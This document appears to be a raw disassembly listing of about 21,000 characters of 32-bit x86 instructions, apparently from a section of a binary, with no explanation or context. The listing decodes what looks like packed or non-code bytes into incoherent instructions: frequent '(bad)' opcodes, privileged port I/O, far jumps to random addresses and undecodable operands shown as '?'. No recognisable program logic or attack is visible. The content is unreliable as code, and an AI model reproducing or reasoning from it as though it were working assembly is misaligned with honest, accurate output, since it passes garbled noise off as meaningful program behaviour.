  40e518:	aad    0xd4
  40e51a:	test   DWORD PTR [edx+0x6],eax
  40e51d:	and    DWORD PTR [esi-0x46805b0a],esp
  40e523:	fcomp  DWORD PTR [edx-0x4]
  40e526:	sahf   
  40e527:	jg     0x40e573
  40e529:	dec    edi
  40e52a:	loop   0x40e518
  40e52c:	sbb    eax,0xb752114f
  40e531:	inc    edi
  40e532:	retf   0xf7db
  40e535:	enter  0x44d0,0xcd
  40e539:	mov    dl,0xd3
  40e53b:	daa    
  40e53c:	ret    0x7909
  40e53f:	cmp    DWORD PTR [ebp+ecx*2-0x5a95b94b],edx
  40e546:	mov    DWORD PTR gs:[eax-0x2595af72],esi
  40e54d:	aaa    
  40e54e:	sbb    dl,BYTE PTR [edx+esi*4]
  40e551:	or     al,BYTE PTR [ecx+0x78223449]
  40e557:	loopne 0x40e5a9
  40e559:	(bad)  
  40e55b:	ret    0x109f
  40e55e:	arpl   ax,bx
  40e560:	push   edx
  40e561:	xchg   esp,eax
  40e562:	sub    BYTE PTR [eax+0x20],ah
  40e565:	inc    ecx
  40e566:	xchg   edi,eax
  40e567:	aam    0x7d
  40e569:	mov    al,0x91
  40e56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e56c:	ficomp WORD PTR es:[ebx+0x5c]
  40e570:	sub    al,0xe3
  40e572:	outs   dx,BYTE PTR ds:[esi]
  40e573:	xor    DWORD PTR [ebp+0x4c],ebp
  40e576:	mov    DWORD PTR [edx],ebx
  40e578:	popf   
  40e579:	push   ebx
  40e57a:	data16 in al,dx
  40e57c:	dec    edx
  40e57d:	clc    
  40e57e:	sbb    dl,dh
  40e580:	lods   al,BYTE PTR ds:[esi]
  40e581:	(bad)  
  40e582:	cmp    bh,BYTE PTR [eax+esi*4+0x24]
  40e586:	inc    ebp
  40e587:	sub    ebp,0x50245e40
  40e58d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e58e:	test   dl,cl
  40e590:	inc    esp
  40e591:	outs   dx,DWORD PTR ds:[esi]
  40e592:	or     ah,ah
  40e594:	mov    ch,0xde
  40e596:	xchg   esp,eax
  40e597:	arpl   WORD PTR [ecx],dx
  40e599:	and    ch,BYTE PTR [eax+0xe]
  40e59c:	jp     0x40e52d
  40e59e:	rcr    BYTE PTR [ebp-0x65333450],1
  40e5a4:	scas   eax,DWORD PTR es:[edi]
  40e5a5:	pusha  
  40e5a6:	mov    ds:0x41e5c1ec,al
  40e5ab:	clc    
  40e5ac:	ds mov dh,0x22
  40e5af:	ja     0x40e5d1
  40e5b1:	ja     0x40e560
  40e5b3:	mov    edx,0x769a060a
  40e5b8:	cwde   
  40e5b9:	jg     0x40e58c
  40e5bb:	ins    BYTE PTR es:[edi],dx
  40e5bc:	fs cmp eax,esp
  40e5bf:	pop    edx
  40e5c0:	jecxz  0x40e564
  40e5c2:	fcomp  QWORD PTR ds:0x2c7ed3d6
  40e5c8:	cmp    DWORD PTR [eax+0x58],ecx
  40e5cb:	ins    BYTE PTR es:[edi],dx
  40e5cc:	fiadd  DWORD PTR [ecx-0x612808f3]
  40e5d2:	pop    edx
  40e5d3:	push   ecx
  40e5d4:	pop    edx
  40e5d5:	es push ebx
  40e5d7:	adc    esp,DWORD PTR [ebx+0x1822d539]
  40e5dd:	or     dh,BYTE PTR [edi-0x3a]
  40e5e0:	add    eax,0x38a3d159
  40e5e5:	adc    BYTE PTR [ebx-0x16],dh
  40e5e8:	and    dh,BYTE PTR [ebx-0x4c3ab96d]
  40e5ee:	fisttp DWORD PTR [ebx+esi*4+0x220d124]
  40e5f5:	sbb    edi,DWORD PTR [esi+0x3940f440]
  40e5fb:	in     al,dx
  40e5fc:	pushf  
  40e5fd:	mov    dh,0x4a
  40e5ff:	xchg   esi,eax
  40e600:	js     0x40e58b
  40e602:	jl     0x40e5e5
  40e604:	push   esi
  40e605:	int    0x27
  40e607:	nop
  40e608:	rol    BYTE PTR [ebp-0x71a72c06],cl
  40e60e:	mov    DWORD PTR [ebx-0x7e70416e],ebp
  40e614:	pop    ebx
  40e615:	jns    0x40e5de
  40e617:	int3   
  40e618:	fcom   QWORD PTR [eax-0x55]
  40e61b:	pop    ds
  40e61c:	std    
  40e61d:	lock cmp eax,0xb1edc915
  40e623:	jo     0x40e675
  40e625:	leave  
  40e626:	cwde   
  40e627:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e628:	push   ds
  40e629:	mov    esi,0xa1ce2b7c
  40e62e:	shl    DWORD PTR [ecx-0x4102ed3],cl
  40e634:	loop   0x40e627
  40e636:	call   0xd8bcc33
  40e63b:	push   cs
  40e63c:	test   eax,0xbe6135ea
  40e641:	enter  0x276,0x29
  40e645:	stc    
  40e646:	sub    al,dh
  40e648:	adc    BYTE PTR es:[eax+0x47],ah
  40e64c:	out    0xc3,eax
  40e64e:	ss jmp 0x2bd36e99
  40e654:	sbb    eax,0x1f10e958
  40e659:	mov    dh,BYTE PTR [eax-0x23b26093]
  40e65f:	mov    esp,0x575a2adb
  40e664:	adc    eax,0x6436376d
  40e669:	pop    edi
  40e66a:	mov    ds:0xa390479a,eax
  40e66f:	cmp    eax,DWORD PTR [edx-0x75c492ab]
  40e675:	add    eax,0xd07aa9ea
  40e67a:	repnz mov ch,0x26
  40e67d:	xor    bh,BYTE PTR [esi+0x13fbdeb0]
  40e683:	cwde   
  40e684:	ja     0x40e6bf
  40e686:	pop    edx
  40e687:	mov    al,BYTE PTR [esi]
  40e689:	inc    eax
  40e68a:	test   al,0x7a
  40e68c:	mov    al,ds:0x2cc648c7
  40e691:	fist   DWORD PTR [ebx+0x6d]
  40e694:	das    
  40e695:	sub    BYTE PTR [edx+0x65],bl
  40e698:	dec    edx
  40e699:	push   es
  40e69a:	and    DWORD PTR [ecx+edi*8-0x2f],edi
  40e69e:	add    bh,BYTE PTR [edi]
  40e6a0:	jmp    0x3545f7c6
  40e6a5:	jmp    0xec06:0xa5bf6155
  40e6ac:	pusha  
  40e6ad:	mov    ss,WORD PTR ds:0x6a3a046c
  40e6b3:	sbb    al,0x6
  40e6b5:	fsubr  DWORD PTR [eax-0x39903dd5]
  40e6bb:	pushf  
  40e6bc:	push   0x16252875
  40e6c1:	in     eax,0xcb
  40e6c3:	test   DWORD PTR [edx-0x23b6efb3],edi
  40e6c9:	sbb    eax,0xaaf38bfd
  40e6ce:	mov    eax,ds:0xe74837b
  40e6d3:	mov    eax,ds:0xa4fe50e1
  40e6d8:	and    eax,0xd5dff2b7
  40e6dd:	cmp    bl,cl
  40e6df:	push   esi
  40e6e0:	out    dx,eax
  40e6e1:	std    
  40e6e2:	mov    dh,0x55
  40e6e4:	mov    esi,0xea3d5fd8
  40e6e9:	pop    edi
  40e6ea:	fadd   st,st(7)
  40e6ec:	mov    bh,0x51
  40e6ee:	icebp  
  40e6ef:	push   esi
  40e6f0:	gs push ebx
  40e6f2:	pop    eax
  40e6f3:	ss dec ecx
  40e6f5:	popa   
  40e6f6:	ss mov bl,0x31
  40e6f9:	sub    dh,BYTE PTR [edi]
  40e6fb:	daa    
  40e6fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e6fd:	and    al,0xec
  40e6ff:	sbb    dl,BYTE PTR [ebp+0x49c20ff6]
  40e705:	xor    DWORD PTR [ebp+0x6f],0x7a
  40e709:	xlat   BYTE PTR ds:[ebx]
  40e70a:	ins    DWORD PTR es:[edi],dx
  40e70b:	add    dh,BYTE PTR [ebp-0x60]
  40e70e:	push   ebp
  40e70f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e710:	clc    
  40e711:	xor    DWORD PTR [ebp-0x5cb01204],esp
  40e717:	and    dh,BYTE PTR [edi]
  40e719:	aas    
  40e71a:	cmp    DWORD PTR [eax-0x7fd79190],0x4286d073
  40e724:	jb     0x40e779
  40e726:	jmp    0xe95b8461
  40e72b:	aas    
  40e72c:	push   esi
  40e72d:	loope  0x40e769
  40e72f:	pop    eax
  40e730:	adc    al,0xc0
  40e732:	push   0x77f56b48
  40e737:	arpl   WORD PTR [ebx+edi*8],si
  40e73a:	xchg   esp,eax
  40e73b:	sbb    DWORD PTR [esp+ebp*8-0x2d],esi
  40e73f:	inc    edx
  40e740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e741:	in     al,dx
  40e742:	push   edi
  40e743:	imul   edx,ebp,0xbc1977ee
  40e749:	jno    0x40e6eb
  40e74b:	push   cs
  40e74c:	or     esp,DWORD PTR [edi-0x52]
  40e74f:	push   ax
  40e751:	xor    al,0x7c
  40e753:	jecxz  0x40e748
  40e755:	bound  ebp,QWORD PTR [ecx-0x7c]
  40e758:	xchg   edx,eax
  40e759:	or     esi,esi
  40e75b:	in     al,dx
  40e75c:	cs xchg ebp,eax
  40e75e:	subps  xmm4,xmm6
  40e761:	inc    edi
  40e762:	test   BYTE PTR ds:0x1b262ebd,0x9a
  40e769:	aad    0x55
  40e76b:	inc    eax
  40e76c:	fisub  WORD PTR [eax]
  40e76e:	daa    
  40e76f:	in     eax,0x64
  40e771:	jl     0x40e777
  40e773:	or     DWORD PTR [eax+0x5e2af76a],esi
  40e779:	pusha  
  40e77a:	cwde   
  40e77b:	paddusb mm4,QWORD PTR [esi+0x1e]
  40e77f:	cmp    al,0x9d
  40e781:	(bad)
  40e785:	inc    ebx
  40e786:	mov    al,0x29
  40e788:	ja     0x40e756
  40e78a:	test   BYTE PTR [edx+0x66dae4d2],dh
  40e790:	sti    
  40e791:	inc    edx
  40e792:	sbb    dl,cl
  40e794:	into   
  40e795:	sub    eax,0x4a33e3b7
  40e79a:	pusha  
  40e79b:	clc    
  40e79c:	add    esp,DWORD PTR ds:0xa0a41160
  40e7a2:	retf   0xab25
  40e7a5:	js     0x40e7ab
  40e7a7:	std    
  40e7a8:	call   0x17cd2542
  40e7ad:	pop    ebp
  40e7ae:	ror    BYTE PTR [edx-0x2ff0e2c3],1
  40e7b4:	in     al,dx
  40e7b5:	test   BYTE PTR [ebx-0x54],cl
  40e7b8:	ins    BYTE PTR es:[edi],dx
  40e7b9:	or     BYTE PTR [edi-0x523bb00b],0xfc
  40e7c0:	ins    BYTE PTR es:[edi],dx
  40e7c1:	js     0x40e756
  40e7c3:	xor    DWORD PTR [esi+0x6e],esi
  40e7c6:	mov    bh,0x65
  40e7c8:	aas    
  40e7c9:	sbb    dl,dh
  40e7cb:	dec    edi
  40e7cc:	push   ds
  40e7cd:	sub    al,0x11
  40e7cf:	shl    BYTE PTR [edi],0xb6
  40e7d2:	adc    bh,al
  40e7d4:	imul   edx
  40e7d6:	leave  
  40e7d7:	xchg   ebx,eax
  40e7d8:	sub    al,0x19
  40e7da:	jns    0x40e7f5
  40e7dc:	xchg   DWORD PTR [edx+0x73],edi
  40e7df:	mov    ds:0x4e3dbd83,al
  40e7e4:	cli    
  40e7e5:	rol    BYTE PTR [edi-0x69df8c97],1
  40e7eb:	pusha  
  40e7ec:	adc    ch,BYTE PTR [esi+0x30]
  40e7ef:	ror    ah,cl
  40e7f1:	jnp    0x40e86c
  40e7f3:	test   al,0x90
  40e7f5:	out    dx,al
  40e7f6:	ret    
  40e7f7:	sub    dl,bl
  40e7f9:	mov    ebp,DWORD PTR [ebx+0x32]
  40e7fc:	jmp    0x40e864
  40e7fe:	mov    eax,0x3822b7f9
  40e803:	and    eax,0x494b767
  40e808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e809:	in     eax,dx
  40e80a:	xor    DWORD PTR [ecx-0x15],edx
  40e80d:	push   0x310004d7
  40e812:	cld    
  40e813:	or     dl,cl
  40e815:	(bad)  
  40e816:	cwde   
  40e817:	sub    BYTE PTR [ebx-0x36b74884],ch
  40e81d:	jmp    0xe4629ba8
  40e822:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e823:	mov    bh,0x9d
  40e825:	in     eax,dx
  40e826:	inc    esi
  40e827:	pop    edi
  40e828:	lahf   
  40e829:	pop    ebx
  40e82a:	leave  
  40e82b:	pop    ebp
  40e82c:	lock sub al,0xd5
  40e82f:	cs and al,0x3e
  40e832:	loopne 0x40e87a
  40e834:	lods   al,BYTE PTR ds:[esi]
  40e835:	repz mov gs,WORD PTR [ebx-0x48fd0839]
  40e83c:	je     0x40e887
  40e83e:	nop
  40e83f:	ja     0x40e883
  40e841:	(bad)  
  40e842:	idiv   ah
  40e844:	loopne 0x40e829
  40e846:	pushf  
  40e847:	push   ecx
  40e848:	int3   
  40e849:	or     al,0xb3
  40e84b:	jo     0x40e82c
  40e84d:	ja     0x40e7e8
  40e84f:	fsub   QWORD PTR [esp+ebp*8+0x7374739f]
  40e856:	cmp    eax,0x27c68280
  40e85b:	add    ebx,DWORD PTR [ecx+edx*4+0x3b7dd2ab]
  40e862:	stc    
  40e863:	add    ebx,DWORD PTR [esi]
  40e865:	ror    DWORD PTR [esi+ebx*8-0x2a8dff3],0xc1
  40e86d:	adc    DWORD PTR [ecx+eiz*8-0x745d03be],0x1e564e50
  40e878:	rcr    bl,0x97
  40e87b:	mov    ebp,0xfa046cd6
  40e880:	fs es call 0x5ad3412b
  40e887:	or     DWORD PTR [ebx+0x4ad90e02],edi
  40e88d:	cmp    al,0xc4
  40e88f:	cwde   
  40e890:	(bad)  
  40e891:	retf   
  40e892:	int    0x3f
  40e894:	mov    al,ch
  40e896:	sbb    eax,0x1130be7a
  40e89b:	add    esi,DWORD PTR [ebx]
  40e89d:	add    al,0x34
  40e89f:	nop
  40e8a0:	mov    eax,0x6be15539
  40e8a5:	or     eax,0xecadcc9b
  40e8aa:	mov    ds:0x8a57d96e,eax
  40e8af:	out    0x59,eax
  40e8b1:	pop    edi
  40e8b2:	test   BYTE PTR [ecx],ah
  40e8b4:	(bad)  
  40e8b5:	hlt    
  40e8b6:	std    
  40e8b7:	arpl   WORD PTR [ebx-0xb],dx
  40e8ba:	dec    ebx
  40e8bb:	mov    esi,0x978578e3
  40e8c0:	lods   eax,DWORD PTR ds:[esi]
  40e8c1:	rcl    BYTE PTR [esi],0x51
  40e8c4:	(bad)  
  40e8c5:	mov    edx,0x9dc7ed40
  40e8ca:	imul   ebp,esp,0x2a2c441c
  40e8d0:	pop    ecx
  40e8d1:	cs rcl esp,cl
  40e8d4:	leave  
  40e8d5:	pop    ecx
  40e8d6:	inc    eax
  40e8d7:	inc    esi
  40e8d8:	mov    ebx,0x72985da6
  40e8dd:	frstor [edi+0x4e]
  40e8e0:	and    eax,0xc8883572
  40e8e5:	(bad)  
  40e8e6:	sbb    BYTE PTR cs:[esi+0x60],ch
  40e8ea:	jmp    0xbc27b25a
  40e8ef:	bound  esi,QWORD PTR [ebx-0x232d5125]
  40e8f5:	mov    ds:0x50a858d2,al
  40e8fa:	sub    al,0xbe
  40e8fc:	stos   BYTE PTR es:[edi],al
  40e8fd:	xchg   esi,eax
  40e8fe:	sbb    eax,0x9369a1b1
  40e903:	rcr    BYTE PTR [ebp-0x3f],1
  40e906:	je     0x40e8f0
  40e908:	mov    eax,ds:0x8bf955d0
  40e90d:	pop    esp
  40e90e:	es pop edx
  40e910:	subps  xmm6,XMMWORD PTR [ebx+0x187ee2c9]
  40e917:	sub    eax,0xc778ec4c
  40e91c:	mov    al,0x5f
  40e91e:	adc    DWORD PTR [edx+edx*4],0xffffffbd
  40e922:	mov    cl,0x72
  40e924:	dec    esp
  40e925:	adc    DWORD PTR [ecx+0x5924e483],eax
  40e92b:	jle    0xc1debb06
  40e931:	xchg   BYTE PTR [eax],ah
  40e933:	in     al,dx
  40e934:	out    0x3f,al
  40e936:	out    0x67,eax
  40e938:	leave  
  40e939:	jo     0x40e8c3
  40e93b:	nop
  40e93c:	test   BYTE PTR [ebp+ebx*1+0x7bfa6401],dl
  40e943:	test   al,0x33
  40e945:	and    eax,0x8c55a094
  40e94a:	outs   dx,DWORD PTR ds:[esi]
  40e94b:	ss dec di
  40e94e:	mov    edi,0x6e6b9779
  40e953:	pop    ds
  40e954:	js     0x40e8dd
  40e956:	retf   0x41f6
  40e959:	call   0xe412:0x10d1db9
  40e960:	push   ebx
  40e961:	cmp    eax,0x6b84cc0b
  40e966:	fdivr  st,st(6)
  40e968:	jnp    0x40e8f2
  40e96a:	fdivr  DWORD PTR [ebp+0x36]
  40e96d:	lock nop
  40e96f:	mov    ?,WORD PTR [ebp+0x3]
  40e972:	jecxz  0x40e8f5
  40e974:	mov    dh,0x23
  40e976:	mov    dh,0x2c
  40e978:	mov    ah,0x9e
  40e97a:	xchg   edi,eax
  40e97b:	imul   ecx,DWORD PTR [ebx],0x1a455f4b
  40e981:	sub    al,0x4b
  40e983:	xchg   ebp,eax
  40e984:	js     0x40e9e5
  40e986:	add    al,0xaf
  40e988:	imul   ecx,DWORD PTR [esi+0x13],0x62
  40e98c:	xor    al,0x1
  40e98e:	sub    ch,BYTE PTR [edx+0x20]
  40e991:	pop    eax
  40e992:	enter  0xe78f,0x28
  40e996:	xor    ch,BYTE PTR [ebx-0x5b]
  40e999:	(bad)  
  40e99a:	mov    WORD PTR [ecx-0x18],cs
  40e99d:	dec    eax
  40e99e:	pop    edx
  40e99f:	adc    ecx,ecx
  40e9a1:	inc    esp
  40e9a2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9a4:	adc    ebp,ebx
  40e9a6:	xchg   esp,eax
  40e9a7:	sub    BYTE PTR [eax],bh
  40e9a9:	ja     0x40e962
  40e9ab:	xor    BYTE PTR [ebp+0x6c],0xfd
  40e9af:	xor    DWORD PTR [esi-0x14],esi
  40e9b2:	test   al,0x2b
  40e9b4:	cld    
  40e9b5:	dec    ebx
  40e9b6:	fs fwait
  40e9b8:	imul   edi,DWORD PTR ds:0xe76c783e,0xe9682860
  40e9c2:	dec    esp
  40e9c3:	fidivr WORD PTR [eax-0x6402068d]
  40e9c9:	push   cs
  40e9ca:	adc    DWORD PTR [eax+0x3c873cf2],0x763c66a4
  40e9d4:	retf   0x6c85
  40e9d7:	push   ecx
  40e9d8:	sub    ah,BYTE PTR [ecx-0x57e47c22]
  40e9de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9df:	lods   al,BYTE PTR ds:[esi]
  40e9e0:	and    al,bh
  40e9e2:	push   edi
  40e9e3:	push   ss
  40e9e4:	sbb    cl,BYTE PTR [esp+esi*2-0x48]
  40e9e8:	into   
  40e9e9:	and    dl,BYTE PTR [esi-0xa38ecd8]
  40e9ef:	mov    bl,cl
  40e9f1:	adc    eax,0x7a4a15b3
  40e9f6:	dec    edi
  40e9f7:	adc    eax,0x34a8c459
  40e9fc:	mov    DWORD PTR [edx-0x6b],ebx
  40e9ff:	dec    edi
  40ea00:	sbb    bh,BYTE PTR [ebp-0x2b281df8]
  40ea06:	xor    al,0xee
  40ea08:	call   0x262455a5
  40ea0d:	dec    eax
  40ea0e:	pop    edx
  40ea0f:	shl    al,1
  40ea11:	fst    QWORD PTR [edi]
  40ea13:	sub    ebp,0x1943356a
  40ea19:	dec    ecx
  40ea1a:	pop    ebx
  40ea1b:	xor    dl,BYTE PTR [edx]
  40ea1d:	xchg   esi,eax
  40ea1e:	xlat   BYTE PTR ds:[ebx]
  40ea1f:	aad    0x0
  40ea21:	fstenv [eax-0x62]
  40ea25:	pushf  
  40ea26:	pop    esi
  40ea27:	xlat   BYTE PTR ds:[ebx]
  40ea28:	cdq    
  40ea29:	pop    ss
  40ea2a:	pop    esi
  40ea2b:	test   BYTE PTR [ebx-0x5a],ch
  40ea2e:	ins    BYTE PTR es:[edi],dx
  40ea2f:	dec    esp
  40ea30:	mov    dh,0x32
  40ea32:	test   dl,dl
  40ea34:	popa   
  40ea35:	xlat   BYTE PTR ds:[ebx]
  40ea36:	jnp    0x40ea20
  40ea38:	mov    DWORD PTR cs:[esi+0x4a40d503],esp
  40ea3f:	pop    ebx
  40ea40:	mov    edi,0x740fc771
  40ea45:	jno    0x40eaa8
  40ea47:	xor    edx,DWORD PTR [esi]
  40ea49:	inc    esp
  40ea4a:	mov    al,ds:0xc591100c
  40ea4f:	mov    al,BYTE PTR [eax-0x165b3b4e]
  40ea55:	clc    
  40ea56:	lahf   
  40ea57:	push   cs
  40ea58:	xchg   edi,eax
  40ea59:	mov    esp,?
  40ea5b:	mov    DWORD PTR [ebx+0x78],eax
  40ea5e:	or     DWORD PTR [ebx-0x5bf9d7d5],edx
  40ea64:	inc    ebp
  40ea65:	shl    BYTE PTR [ecx+0x18],0x99
  40ea69:	(bad)  
  40ea6a:	jecxz  0x40ea45
  40ea6c:	xor    DWORD PTR [edi],ebx
  40ea6e:	cdq    
  40ea6f:	lods   eax,DWORD PTR ds:[esi]
  40ea70:	ret    
  40ea71:	retf   0xa07c
  40ea74:	mov    WORD PTR [edi+0x2a],fs
  40ea77:	mov    eax,0xa51c3f76
  40ea7c:	push   ds
  40ea7d:	push   ecx
  40ea7e:	and    BYTE PTR [eax+eiz*2],dl
  40ea81:	xchg   ebp,eax
  40ea82:	(bad)  
  40ea84:	mov    es,ecx
  40ea86:	push   es
  40ea87:	addr16 or al,0xc9
  40ea8a:	add    DWORD PTR [edx],ecx
  40ea8c:	sub    dh,BYTE PTR [ecx-0x5b7c2b1d]
  40ea92:	iret   
  40ea93:	cld    
  40ea94:	repnz mov edx,gs
  40ea97:	jl     0x40eac4
  40ea99:	arpl   WORD PTR [edi+0x4d],bp
  40ea9c:	sub    BYTE PTR [ebx-0x40af246a],0x6d
  40eaa3:	jne    0x40ea26
  40eaa5:	sbb    bh,ah
  40eaa7:	pop    esp
  40eaa8:	test   eax,edi
  40eaaa:	pushf  
  40eaab:	xchg   cl,bh
  40eaad:	int    0xb3
  40eaaf:	mov    BYTE PTR [edx],cl
  40eab1:	imul   edx,DWORD PTR [eax+0x5a],0xe19434d1
  40eab8:	scas   eax,DWORD PTR es:[edi]
  40eab9:	iret   
  40eaba:	aas    
  40eabb:	nop
  40eabc:	or     esi,eax
  40eabe:	cmp    DWORD PTR [ecx+0xc740c12],edi
  40eac4:	jbe    0x40eb14
  40eac6:	adc    DWORD PTR fs:[edi+0x2f],esp
  40eaca:	jae    0x40eaa7
  40eacc:	sbb    dl,BYTE PTR [eax]
  40eace:	into   
  40eacf:	mov    eax,0x200e6608
  40ead4:	mov    ecx,0x58fbf9dc
  40ead9:	sbb    dl,ch
  40eadb:	jp     0x40eb56
  40eadd:	and    eax,0x9e029c30
  40eae2:	js     0x40eb0f
  40eae4:	repz push edi
  40eae6:	pop    edi
  40eae7:	out    dx,al
  40eae8:	push   edi
  40eae9:	sbb    DWORD PTR [edi+0x57],esi
  40eaec:	addr16 mov esi,0x3ae7284a
  40eaf2:	loopne 0x40eb6c
  40eaf4:	call   0xf297bc0b
  40eaf9:	arpl   WORD PTR [edx-0x59],cx
  40eafc:	cwde   
  40eafd:	ret    0xfafb
  40eb00:	mov    BYTE PTR [edx+0x1],bl
  40eb03:	fs ss loope 0x40eb42
  40eb07:	dec    esi
  40eb08:	jb     0x40eaee
  40eb0a:	(bad)  
  40eb0b:	int    0x8e
  40eb0d:	xchg   edx,eax
  40eb0e:	pop    ecx
  40eb0f:	repnz rol DWORD PTR [ecx-0x16838242],1
  40eb16:	sbb    al,0x5a
  40eb18:	jnp    0x40ea9b
  40eb1a:	clc    
  40eb1b:	les    edx,FWORD PTR [edi]
  40eb1d:	jge    0x40eb1b
  40eb1f:	lods   eax,DWORD PTR ds:[esi]
  40eb20:	pop    edx
  40eb21:	xor    BYTE PTR ds:0xce41e6cf,ch
  40eb27:	jae    0x40eb00
  40eb29:	es pop ebp
  40eb2b:	jns    0x40eaf1
  40eb2d:	or     eax,0xd764b392
  40eb32:	das    
  40eb33:	hlt    
  40eb34:	mov    ds:0x5520a6e4,al
  40eb39:	imul   ebx,DWORD PTR [eax+0x2e0abc54],0xffffffc9
  40eb40:	mov    ebx,0xcc780fec
  40eb45:	ret    
  40eb46:	xchg   ebp,eax
  40eb47:	frstor [ebp+0x47]
  40eb4a:	popa   
  40eb4b:	mov    edi,0xfda26d58
  40eb50:	xchg   esp,eax
  40eb51:	xchg   ebp,eax
  40eb52:	aad    0x1c
  40eb54:	ins    DWORD PTR es:[edi],dx
  40eb55:	mov    eax,DWORD PTR ds:0x40400714
  40eb5b:	hlt    
  40eb5c:	in     eax,dx
  40eb5d:	int3   
  40eb5e:	gs mov ss,ebx
  40eb61:	fsubrp st(6),st
  40eb63:	fucomp st(7)
  40eb65:	ins    BYTE PTR es:[edi],dx
  40eb66:	fucomip st,st(6)
  40eb68:	dec    esp
  40eb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb6a:	pusha  
  40eb6b:	xchg   ecx,eax
  40eb6c:	pop    ds
  40eb6d:	jle    0x40eb75
  40eb6f:	mov    eax,0xba7f985d
  40eb74:	in     al,dx
  40eb75:	mov    eax,0x1e5bb55f
  40eb7a:	xchg   esi,eax
  40eb7b:	je     0x40eb6e
  40eb7d:	(bad)  
  40eb7e:	fimul  DWORD PTR [ebp-0x28]
  40eb81:	mul    BYTE PTR [eax]
  40eb83:	das    
  40eb84:	(bad)  
  40eb85:	sti    
  40eb86:	push   esi
  40eb87:	adc    al,0xe4
  40eb89:	shl    DWORD PTR [eax-0x1d],0x26
  40eb8d:	call   0xd6882f75
  40eb92:	push   es
  40eb93:	jl     0x40eb8a
  40eb95:	fisub  DWORD PTR [edi-0xe]
  40eb98:	jl     0x40eb65
  40eb9a:	ins    BYTE PTR es:[edi],dx
  40eb9b:	xor    al,0x5c
  40eb9d:	sti    
  40eb9e:	push   0x45
  40eba0:	mov    bl,0x12
  40eba2:	dec    esi
  40eba3:	dec    edi
  40eba4:	jge    0x40eb99
  40eba6:	push   ds
  40eba7:	sub    al,0xd0
  40eba9:	cld    
  40ebaa:	add    eax,0x36129b62
  40ebaf:	retf   0xd1f9
  40ebb2:	les    ebx,FWORD PTR [edi]
  40ebb4:	xor    eax,0x10e0265
  40ebb9:	pop    ebx
  40ebba:	mov    bl,0x50
  40ebbc:	cld    
  40ebbd:	add    esi,ebx
  40ebbf:	mov    WORD PTR [ebp+eax*2+0x21b3e1c4],gs
  40ebc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebc7:	rol    esi,0x7d
  40ebca:	inc    edi
  40ebcb:	sbb    al,0x6e
  40ebcd:	aad    0x97
  40ebcf:	add    ecx,DWORD PTR [eax+0x51]
  40ebd2:	mov    eax,ds:0xbe156726
  40ebd7:	outs   dx,BYTE PTR ds:[esi]
  40ebd8:	cmp    ebp,esi
  40ebda:	cmp    bl,BYTE PTR ds:0x2cf9ec24
  40ebe0:	inc    eax
  40ebe1:	jo     0x40eb69
  40ebe3:	xchg   esi,eax
  40ebe4:	mov    bl,0xa8
  40ebe6:	push   cs
  40ebe7:	in     al,0xb8
  40ebe9:	jmp    0x40ec11
  40ebeb:	outs   dx,BYTE PTR ds:[esi]
  40ebec:	cli    
  40ebed:	scas   eax,DWORD PTR es:[edi]
  40ebee:	adc    al,0x80
  40ebf0:	pop    ebx
  40ebf1:	sti    
  40ebf2:	fisub  WORD PTR [esi+eiz*4]
  40ebf5:	inc    ecx
  40ebf6:	cmp    DWORD PTR [esi+0x60],esp
  40ebf9:	jge    0x40ebc8
  40ebfb:	jl     0x40ec25
  40ebfd:	fwait
  40ebfe:	int3   
  40ebff:	icebp  
  40ec00:	inc    esp
  40ec01:	sahf   
  40ec02:	rol    eax,cl
  40ec04:	loope  0x40ebc0
  40ec06:	dec    edi
  40ec07:	push   esi
  40ec08:	das    
  40ec09:	stc    
  40ec0a:	jle    0x40ebaa
  40ec0c:	push   0x3
  40ec0e:	mov    esi,0x66819bc4
  40ec13:	sbb    dh,0xb1
  40ec16:	gs enter 0x8153,0x84
  40ec1b:	and    esi,edi
  40ec1d:	xchg   BYTE PTR [eax+0x1ba847a3],bl
  40ec23:	mov    BYTE PTR [eax],bl
  40ec25:	push   edx
  40ec26:	mov    ah,0xa5
  40ec28:	mov    WORD PTR [edx+0x5e],fs
  40ec2b:	inc    esp
  40ec2c:	dec    ebp
  40ec2d:	out    0xbd,al
  40ec2f:	sbb    esp,0x5d
  40ec32:	mov    DWORD PTR [esi+0x47228def],0x35f08381
  40ec3c:	jbe    0x40ebc8
  40ec3e:	xlat   BYTE PTR ds:[ebx]
  40ec3f:	add    BYTE PTR [ecx-0x3c],cl
  40ec42:	sub    ebx,DWORD PTR [ebp-0x56]
  40ec45:	jnp    0x40ec95
  40ec47:	les    edi,FWORD PTR [eax+0x6ba1e4d5]
  40ec4d:	jge    0x40eccb
  40ec4f:	bound  eax,QWORD PTR [edx-0x52]
  40ec52:	(bad)  
  40ec53:	ins    BYTE PTR es:[edi],dx
  40ec54:	stos   DWORD PTR es:[edi],eax
  40ec55:	(bad)
  40ec59:	mov    dl,0x26
  40ec5b:	aaa    
  40ec5c:	cwde   
  40ec5d:	inc    esi
  40ec5e:	out    0xcd,al
  40ec60:	adc    ch,0x23
  40ec63:	xor    eax,0x29a69dfe
  40ec68:	mov    bh,0x46
  40ec6a:	pop    edi
  40ec6b:	bound  edi,QWORD PTR [esi-0x531ab7cb]
  40ec71:	inc    ebp
  40ec72:	pop    gs
  40ec74:	ror    DWORD PTR [ecx-0x48],cl
  40ec77:	or     eax,0xfdcf3dc2
  40ec7c:	stos   DWORD PTR es:[edi],eax
  40ec7d:	scas   al,BYTE PTR es:[edi]
  40ec7e:	(bad)  
  40ec7f:	lock int3 
  40ec81:	ret    0x5394
  40ec84:	xor    eax,0xc72af2f7
  40ec89:	xor    DWORD PTR [eax],ecx
  40ec8b:	hlt    
  40ec8c:	mov    ds:0xcc4eda56,al
  40ec91:	mov    edx,0xf241fc5d
  40ec96:	cli    
  40ec97:	mov    ds:0x534c0ed4,eax
